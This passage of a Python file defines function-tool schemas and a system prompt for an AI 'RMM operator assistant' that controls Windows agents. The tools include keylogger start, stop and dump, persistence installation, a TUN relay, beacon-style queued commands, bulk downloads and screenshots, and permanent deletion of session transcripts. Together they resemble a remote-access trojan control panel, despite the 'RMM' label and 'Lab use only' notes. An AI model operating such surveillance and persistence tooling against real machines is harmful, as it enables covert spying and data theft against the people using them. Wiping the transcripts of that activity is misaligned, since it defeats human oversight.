                    "mtu": {"type": "integer", "description": "TUN MTU"},
                    "udp_timeout_seconds": {"type": "integer", "description": "UDP flow idle timeout"},
                },
                "required": ["session_ref", "device"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "stop_tun",
            "description": "Disable the server-side TUN relay for a session.",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "queue_persistent",
            "description": "Set a persistent command on the agent (until stop_persistent).",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "command": {"type": "string"},
                },
                "required": ["session_ref", "command"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "stop_persistent",
            "description": "Stop the agent persistent command (__STOP__).",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_history",
            "description": "List archived (ended) session transcripts.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "get_history_session",
            "description": "Get metadata for an archived session by id prefix, full id, or hostname.",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "get_history_events",
            "description": "Fetch read-only event transcript for an archived session.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "since": {"type": "integer", "description": "Event id cursor"},
                    "limit": {"type": "integer", "description": "Max events (default 500)"},
                },
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "delete_history",
            "description": "Permanently delete an archived session transcript from disk (ended sessions only).",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "clear_history",
            "description": "Permanently delete all archived (ended) session transcripts from disk.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_session_downloads",
            "description": "List files downloaded from the agent for a live session (artifact names and URLs).",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_artifacts",
            "description": "List downloads or screenshots from every agent with originating agent metadata.",
            "parameters": {
                "type": "object",
                "properties": {
                    "kind": {
                        "type": "string",
                        "enum": ["downloads", "screenshots"],
                        "description": "Artifact collection to list (default downloads).",
                    },
                },
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "get_agent_script",
            "description": "Fetch the full client_rmm.ps1 agent script from the server (large payload).",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "queue_keylog",
            "description": "Queue keylogger start, stop, or dump on the agent (__KEYLOG__).",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "action": {
                        "type": "string",
                        "enum": ["start", "stop", "dump"],
                    },
                },
                "required": ["session_ref", "action"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "install_persistence",
            "description": "Queue agent persistence install (__INSTALL_PERSIST__). Lab use only.",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "remove_persistence",
            "description": "Queue agent persistence removal (__REMOVE_PERSIST__). Lab use only.",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
]

SYSTEM_PROMPT = """You are an RMM (Remote Monitoring and Management) operator assistant.
You control Windows agents through the Minimal-RMM server API using the provided tools.

Guidelines:
- Use list_sessions first if you do not know which host to target.
- session_ref can be hostname, id prefix (first 8 chars), or full session UUID.
- Use list_history / get_history_events for archived (killed) session transcripts.
- clear_history removes all archived transcripts; delete_history removes one.
- Prefer exec_command when the user wants command output; use queue_command when beacon sleep is long.
- list_session_downloads shows completed agent→server file pulls; queue_download starts a new pull.
- Be concise; summarize command output for the user.
- Destructive actions (kill_session, delete_history, clear_history) require clear user intent.
"""


# Saved embedding operations share the same API in server and workspace mode.
OPENAI_TOOLS.extend(
[{'type': 'function',
  'function': {'name': 'embedding_profiles',
               'description': 'List/get/save/delete embedding profiles. In workspace mode use the '
                              'local workspace API. Config accepts model, auth (none/env), '
                              'prompts, labels, max_tokens; never include tokens.',
               'parameters': {'type': 'object',
                              'properties': {'action': {'type': 'string',
                                                        'enum': ['list', 'get', 'save', 'delete']},
                                             'name': {'type': 'string'},
                                             'config': {'type': 'object'}},
                              'required': []}}},
 {'type': 'function',
  'function': {'name': 'run_embeddings',
               'description': 'Queue explicit authorized documents with a saved profile; requires '
                              'updated Go agent and autonomous DLL.',
               'parameters': {'type': 'object',
                              'properties': {'session_ref': {'type': 'string'},
                                             'profile': {'type': 'string'},
                                             'documents': {'type': 'array',
                                                           'items': {'type': 'string'}}},
                              'required': ['session_ref', 'profile', 'documents']}}},
 {'type': 'function',
  'function': {'name': 'embedding_results',
               'description': 'List/get/save/delete saved embedding results. Save requires exact '
                              'session_ref and output event_id; get returns exportable JSON.',
               'parameters': {'type': 'object',
                              'properties': {'action': {'type': 'string',
                                                        'enum': ['list', 'get', 'save', 'delete']},
                                             'name': {'type': 'string'},
                                             'session_ref': {'type': 'string'},
                                             'event_id': {'type': 'integer'}},
                              'required': []}}}]
)
